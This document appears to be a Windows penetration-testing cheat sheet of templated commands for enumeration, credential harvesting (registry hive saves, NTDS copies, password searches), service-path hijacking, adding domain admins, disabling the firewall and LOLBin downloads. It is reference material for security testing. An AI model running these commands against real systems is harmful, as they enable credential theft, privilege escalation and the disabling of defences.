# Windows

## system

### System info

Show system info with Windows.

Print full Windows system information.

```cmd title:"Windows Show System Info"
systeminfo
```
<!-- cheat -->

### Hostname

Run hostname with Windows.

Print hostname.

```cmd title:"Windows Run Hostname"
hostname
```
<!-- cheat -->

### Computer name

Run computer name with Windows.

Print computer name from PowerShell.

```powershell title:"Windows Run Computer Name"
$env:COMPUTERNAME
```
<!-- cheat -->

## files

### Find password strings

Find password strings with Windows.

Search common document types for password strings.

```cmd title:"Windows Find Password Strings"
findstr /si "password" *.txt *.xml *.docx
```
<!-- cheat -->

### GPP cpassword

Dump GPP cpassword with Windows.

Search SYSVOL policies for Group Policy Preferences cpassword values.

```cmd title:"Windows Dump GPP Cpassword"
findstr /S /I cpassword "\\$domain\sysvol\$domain\policies\*.xml"
```
<!-- cheat
var domain
-->

### Recycle Bin

List recycle bin with Windows.

Recursively list Recycle Bin contents.

```cmd title:"Windows List Recycle Bin"
dir C:\$Recycle.Bin /s /b
```
<!-- cheat -->

### Hidden files

List hidden files with Windows.

List hidden files in a path.

```cmd title:"Windows List Hidden Files"
dir /a:h "$path"
```
<!-- cheat
var path
-->

### Recursive list

List recursive list with Windows.

Recursively list files by full path.

```cmd title:"Windows List Recursive List"
dir /s /b
```
<!-- cheat -->

### Hosts file

Run hosts file with Windows.

Print the Windows hosts file.

```cmd title:"Windows Run Hosts File"
type C:\WINDOWS\System32\drivers\etc\hosts
```
<!-- cheat -->

## process and services

### Scheduled tasks

List scheduled tasks with Windows.

List scheduled tasks verbosely.

```cmd title:"Windows List Scheduled Tasks"
schtasks /query /fo LIST /v
```
<!-- cheat -->

### Find scheduled task

Find scheduled task with Windows.

Find a scheduled task by name.

```cmd title:"Windows Find Scheduled Task"
schtasks /query /fo LIST 2>nul | findstr "$task_name"
```
<!-- cheat
var task_name
-->

### Processes

List processes with Windows.

List processes verbosely.

```cmd title:"Windows List Processes"
tasklist /V
```
<!-- cheat -->

### Processes with services

List processes with services with Windows.

List processes and linked services.

```cmd title:"Windows List Processes with Services"
tasklist /SVC
```
<!-- cheat -->

### Service permissions

Check service permissions with Windows.

Check service permissions with accesschk.

```cmd title:"Windows Check Service Permissions"
accesschk.exe /accepteula -ucqv "$service_name"
```
<!-- cheat
var service_name
-->

### Reconfigure service command

Enumerate reconfigure service command with Windows.

Set a service binary path to a command.

```cmd title:"Windows Enumerate Reconfigure Service Command"
sc config "$service_name" binpath= "$command"
```
<!-- cheat
var service_name
var command
-->

### Start service

Start service with Windows.

Start a service.

```cmd title:"Windows Start Service"
net start "$service_name"
```
<!-- cheat
var service_name
-->

## registry

### Winlogon

Enumerate winlogon with Windows.

Query Winlogon registry values.

```cmd title:"Windows Enumerate Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
<!-- cheat -->

### HKLM password search

Dump HKLM password search with Windows.

Search HKLM registry strings for password.

```cmd title:"Windows Dump HKLM Password Search"
reg query HKLM /f password /t REG_SZ /s
```
<!-- cheat -->

### HKCU password search

Dump HKCU password search with Windows.

Search HKCU registry strings for password.

```cmd title:"Windows Dump HKCU Password Search"
reg query HKCU /f password /t REG_SZ /s
```
<!-- cheat -->

### Save hives

Run save hives with Windows.

Save SAM, SECURITY, and SYSTEM hives.

```cmd title:"Windows Run Save Hives"
reg save HKLM\SAM C:\Windows\Temp\sam.save
reg save HKLM\SECURITY C:\Windows\Temp\security.save
reg save HKLM\SYSTEM C:\Windows\Temp\system.save
```
<!-- cheat -->

## users and groups

### Whoami privileges

Enumerate whoami privileges with Windows.

Print current privileges.

```cmd title:"Windows Enumerate Whoami Privileges"
whoami /priv
```
<!-- cheat -->

### User info

Show user info with Windows.

Show local user information.

```cmd title:"Windows Show User Info"
net user "$target_user"
```
<!-- cheat
var target_user
-->

### Add local user

Add local user with Windows.

Create a local user.

```cmd title:"Windows Add Local User"
net user "$target_user" "$target_pass" /ADD
```
<!-- cheat
var target_user
var target_pass
-->

### Add local admin

Add local admin with Windows.

Add a user to local administrators.

```cmd title:"Windows Add Local Admin"
net localgroup administrators "$target_user" /add
```
<!-- cheat
var target_user
-->

### Runas

Execute runas with Windows.

Run cmd as another user.

```cmd title:"Windows Execute Runas"
runas /user:$domain\$user cmd.exe
```
<!-- cheat
var domain
var user
-->

### Local group members

List local group members with Windows.

List members of a local group.

```cmd title:"Windows List Local Group Members"
net localgroup "$group_name"
```
<!-- cheat
var group_name
-->

## domain

### Domain DNS

Enumerate domain DNS with Windows.

Query domain DNS records from `%USERDNSDOMAIN%`.

```cmd title:"Windows Enumerate Domain DNS"
nslookup -type=any %USERDNSDOMAIN%.
```
<!-- cheat -->

### Domain name

Run domain name with Windows.

Print NetBIOS domain.

```cmd title:"Windows Run Domain Name"
echo %USERDOMAIN%
```
<!-- cheat -->

### Domain FQDN

Run domain FQDN with Windows.

Print DNS domain.

```cmd title:"Windows Run Domain FQDN"
echo %USERDNSDOMAIN%
```
<!-- cheat -->

### Logon server

Start logon server with Windows.

Print logon server.

```cmd title:"Windows Start Logon Server"
echo %LOGONSERVER%
```
<!-- cheat -->

### Domain user info

Show domain user info with Windows.

Show domain user info.

```cmd title:"Windows Show Domain User Info"
net user "$target_user" /domain
```
<!-- cheat
var target_user
-->

### Add Domain Admin

Add domain admin with Windows.

Add a user to Domain Admins.

```cmd title:"Windows Add Domain Admin"
net group "Domain Admins" "$target_user" /add /domain
```
<!-- cheat
var target_user
-->

### Domain controllers

List domain controllers with Windows.

List domain controllers.

```cmd title:"Windows List Domain Controllers"
nltest /dclist:$domain
```
<!-- cheat
var domain
-->

### Domain trusts

List domain trusts with Windows.

List domain trust relationships.

```cmd title:"Windows List Domain Trusts"
nltest /domain_trusts
```
<!-- cheat -->

### Enable SID history

Enable SID history with Windows.

Enable SID history on a trust.

```cmd title:"Windows Enable SID History"
netdom trust "$source_domain" /d:"$target_domain" /enablesidhistory:yes
```
<!-- cheat
var source_domain
var target_domain
-->

## network

### ARP cache

Run ARP cache with Windows.

Print ARP cache.

```cmd title:"Windows Run ARP Cache"
arp -a
```
<!-- cheat -->

### Domain shares

List domain shares with Windows.

List domain shares.

```cmd title:"Windows List Domain Shares"
net view /all /domain "$domain"
```
<!-- cheat
var domain
-->

### Host shares

List host shares with Windows.

List shares on a host.

```cmd title:"Windows List Host Shares"
net view "\\$rhost_name" /ALL
```
<!-- cheat
var rhost_name
-->

### Mount share

Mount share with Windows.

Mount an SMB share to `x:`.

```cmd title:"Windows Mount Share"
net use x: "\\$rhost_name\$share"
```
<!-- cheat
var rhost_name
var share
-->

## firewall

### Firewall state

Show firewall state with Windows.

Show firewall state.

```cmd title:"Windows Show Firewall State"
netsh advfirewall show allprofiles
```
<!-- cheat -->

### Firewall off

Disable firewall off with Windows.

Disable Windows Firewall for all profiles.

```cmd title:"Windows Disable Firewall Off"
netsh advfirewall set allprofiles state off
```
<!-- cheat -->

### Firewall on

Enable firewall on with Windows.

Enable Windows Firewall for all profiles.

```cmd title:"Windows Enable Firewall on"
netsh advfirewall set allprofiles state on
```
<!-- cheat -->

### Open RDP

Run open RDP with Windows.

Open RDP on the firewall.

```cmd title:"Windows Run Open RDP"
netsh firewall add portopening TCP 3389 "Remote Desktop"
```
<!-- cheat -->

## shadow copy and ntds

### Create shadow copy

Create shadow copy with Windows.

Create a shadow copy for `C:`.

```cmd title:"Windows Create Shadow Copy"
wmic shadowcopy call create Volume='C:\'
```
<!-- cheat -->

### List shadow copies

List shadow copies with Windows.

List volume shadow copies.

```cmd title:"Windows List Shadow Copies"
vssadmin list shadows
```
<!-- cheat -->

### IFM NTDS dump

Dump IFM NTDS dump with Windows.

Create an IFM copy of AD DS.

```cmd title:"Windows Dump IFM NTDS Dump"
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```
<!-- cheat -->

### Copy NTDS with VSS

Copy NTDS with VSS with Windows.

Copy `ntds.dit` via VSS.

```cmd title:"Windows Copy NTDS with VSS"
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit
```
<!-- cheat -->

## transfer

### JScript download

Download JScript download with Windows.

Download a file with WinHttpRequest through cscript.

```cmd title:"Windows Download JScript Download"
echo var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), false);WinHttpReq.Send();WScript.Echo(WinHttpReq.ResponseText); > fu.js && cscript /nologo fu.js "$url" > "$output_file"
```
<!-- cheat
var url
var output_file
-->

### Defender download

Download defender download with Windows.

Download a file with MpCmdRun.

```cmd title:"Windows Download Defender Download"
mpcmdrun.exe -DownloadFile -url "$url" -path "$output_file"
```
<!-- cheat
var url
var output_file
-->
